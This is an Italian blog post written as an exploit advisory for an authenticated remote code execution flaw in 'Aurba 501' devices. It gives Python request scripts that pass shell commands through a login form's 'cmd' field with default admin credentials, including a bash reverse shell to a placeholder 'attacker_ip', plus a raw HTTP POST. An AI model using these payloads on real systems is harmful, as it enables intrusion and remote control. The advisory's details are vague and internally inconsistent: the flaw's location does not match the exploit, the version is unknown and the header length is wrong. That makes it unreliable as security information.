---
layout: post
title: '[webapps] Aurba 501 - Authenticated RCE' 
date: 2024-08-24
categories: [security, ransomware]
---

# [webapps] Aurba 501 - Authenticated RCE

## Introduzione

Questo articolo riguarda una vulnerabilità identificata nei dispositivi Aurba 501. Si tratta di una condizione di Esecuzione di Codice Remoto (Remote Code Execution - RCE) che richiede autenticazione. La vulnerabilità permette ad un attaccante di eseguire codice arbitrario sulla macchina target, portando a una potenziale compromissione del sistema.

## Dettagli della vulnerabilità

La vulnerabilità risiede nel meccanismo di autenticazione dei dispositivi Aurba 501. Un attaccante autenticato può sfruttare questa vulnerabilità per eseguire comandi remoti, permettendogli di assumere il controllo del dispositivo. Non è chiaro in quale versione del software Aurba la vulnerabilità sia presente, ma è evidente che le versioni non aggiornate sono maggiormente esposte a rischio.

## Esempio di Payload Semplice

Di seguito è presentato un esempio di payload semplice che sfrutta questa vulnerabilità:

```python
import requests
url = "http://target.com/login"
data = {"username": "admin", "password": "admin", "cmd": "ls"}
response = requests.post(url, data=data)
print(response.text)
```

## Esempio di Payload Avanzato

Un esempio di payload avanzato potrebbe includere l'upload di uno script bash che consente un accesso persistente al sistema:

```python
import requests
url = "http://target.com/login"
data = {"username": "admin", "password": "admin", "cmd": "echo 'bash -i >& /dev/tcp/attacker_ip/8080 0>&1' > script.sh"}
response = requests.post(url, data=data)
print(response.text)
```

## Procedura per riprodurre la vulnerabilità

1. L'attaccante deve avere accesso alle credenziali di autenticazione del dispositivo Aurba 501.
2. Utilizzando le credenziali, l'attaccante può eseguire comandi arbitrari sul dispositivo.

## Richiesta HTTP 

La seguente è un esempio di richiesta HTTP POST che può essere utilizzata per inviare il payload:

```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 66

username=admin&password=admin&cmd=echo 'ls' > script.sh
```

## Impatto della vulnerabilità

Questa vulnerabilità può portare ad una compromissione totale del sistema, permettendo all'attaccante di eseguire codice arbitrario, rubare dati sensibili, installare malware o creare un accesso persistente al dispositivo.

## Patch e Mitigazioni

Al momento non è stato rilasciato alcun aggiornamento software per mitigare questa vulnerabilità. Gli amministratori di sistema sono invitati a monitorare attivamente i loro dispositivi e a modificare le credenziali di default per ridurre il rischio di attacchi.

## Conclusione

Questa vulnerabilità è un serio problema di sicurezza che richiede una risposta tempestiva. Si raccomanda vivamente di modificare le credenziali di default e monitorare attentamente i dispositivi per qualsiasi attività sospetta.

## Considerazioni

L'autenticazione è un elemento cruciale della sicurezza informatica. Questa vulnerabilità mette in evidenza l'importanza di implementare meccanismi di autenticazione robusti e di mantenere i dispositivi costantemente aggiornati.

